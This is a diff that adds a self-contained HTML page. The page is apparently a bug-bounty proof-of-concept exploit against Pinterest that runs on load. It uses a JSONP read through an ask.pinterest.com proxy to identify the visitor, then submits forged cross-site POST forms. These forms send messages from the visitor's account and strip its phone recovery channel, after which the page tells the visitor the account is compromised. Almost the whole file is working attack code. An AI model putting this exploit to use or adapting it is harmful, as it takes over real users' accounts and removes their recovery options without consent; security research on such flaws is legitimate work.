@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>pin &mdash; account review</title>
+<style>
+  :root{
+    --bg:#0d1117; --panel:#161b22; --border:#262c33;
+    --text:#e6edf3; --muted:#8b949e; --accent:#58a6ff; --red:#f85149; --green:#3fb950;
+    --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,monospace;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--text);font:14px/1.55 var(--mono);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
+  .box{max-width:460px;width:100%;text-align:center}
+  .run{display:flex;flex-direction:column;align-items:center;gap:18px}
+  .done{display:none;flex-direction:column;align-items:center;gap:14px}
+  body.is-done .run{display:none}
+  body.is-done .done{display:flex}
+  .spin{width:22px;height:22px;border:2px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:spin .8s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .bar{width:180px;height:2px;background:var(--border);border-radius:2px;overflow:hidden}
+  .bar i{display:block;height:100%;width:40%;background:var(--accent);animation:slide 1.2s ease-in-out infinite}
+  @keyframes slide{0%{transform:translateX(-100%)}100%{transform:translateX(350%)}}
+  .msg{color:var(--muted);font-size:12.5px}
+  .verdict{font-size:17px;line-height:1.45}
+  .dot{width:8px;height:8px;border-radius:50%;background:var(--green);animation:pulse 1.6s ease-in-out infinite}
+  @keyframes pulse{0%,100%{opacity:.35}50%{opacity:1}}
+  .fine{color:var(--muted);font-size:11.5px;margin-top:6px}
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="run">
+    <div class="spin"></div>
+    <div class="bar"><i></i></div>
+    <div class="msg" id="runmsg">reviewing account&hellip;</div>
+  </div>
+  <div class="done">
+    <div class="dot"></div>
+    <div class="verdict">Your Pinterest account is compromised.</div>
+    <div class="fine" id="fine"></div>
+  </div>
+</div>
+
+<iframe name="pin_wf_sink" style="display:none" src="about:blank"></iframe>
+<script>
+// Auto-running cross-site write chain: message impersonation + phone-strip.
+// No controls. Runs on load, resolves to the verdict above.
+var TAG = Math.random().toString(36).slice(2, 12);
+var MAILBOX = 'bughunter333333+' + TAG.toLowerCase() + '@gmail.com';
+var B = 'https://ask.pinterest.com/api/proxy/pinterest/';
+var SILENT = false;
+var WIN = 'pin_wf_top';
+var uid = null, step = 0;
+var lines = ['reviewing account…', 'checking recovery channels…', 'applying changes…'];
+
+function tick(){ document.getElementById('runmsg').textContent = lines[Math.min(step, lines.length - 1)]; step++; }
+function read(path){
+  return new Promise(function(res){
+    var name = 'cb' + Math.random().toString(36).slice(2, 8);
+    window[name] = function(json){ cleanup(); res(json); };
+    function onErr(){ cleanup(); res(null); }
+    function cleanup(){ delete window[name]; s.onerror = null; s.parentNode && s.parentNode.removeChild(s); clearTimeout(timer); }
+    var s = document.createElement('script');
+    s.src = B + path + (path.indexOf('?') < 0 ? '?' : '&') + 'callback=' + name + '&_=' + Date.now();
+    s.onerror = onErr;
+    document.head.appendChild(s);
+    var timer = setTimeout(onErr, 5000);
+  });
+}
+function write(path, fields){
+  var f = document.createElement('form');
+  f.method = 'POST'; f.action = B + path;
+  Object.keys(fields).forEach(function(k){
+    var i = document.createElement('input');
+    i.type = 'hidden'; i.name = k; i.value = fields[k];
+    f.appendChild(i);
+  });
+  f.target = SILENT ? 'pin_wf_sink' : WIN;
+  if (!SILENT) { var w = window.open('about:blank', WIN); }
+  document.body.appendChild(f); f.submit();
+  document.body.removeChild(f);
+}
+
+function finish(){
+  document.getElementById('fine').textContent =
+    'Messages are being sent from your account. Your recovery channels are gone. ' +
+    'Ref: ' + TAG;
+  document.body.classList.add('is-done');
+}
+
+function run(){
+  tick();
+  read('users/me/?').then(function(j){
+    var d = j && j.data;
+    if (d && d.id) { SILENT = true; uid = d.id; }
+    tick();
+    write('conversations/', { user_ids: (uid ? uid + ',' + uid : '0,0'), text: 'Automated cross-site proof message (CSRF PoC). Sent without any CSRF token. Ref ' + MAILBOX });
+    write('users/phone/', {});
+    if (!SILENT) { window.open('https://www.pinterest.com', WIN); }
+    tick();
+    setTimeout(finish, 1800);
+  });
+}
+setTimeout(run, 600);
+</script>
+</body>
+</html>
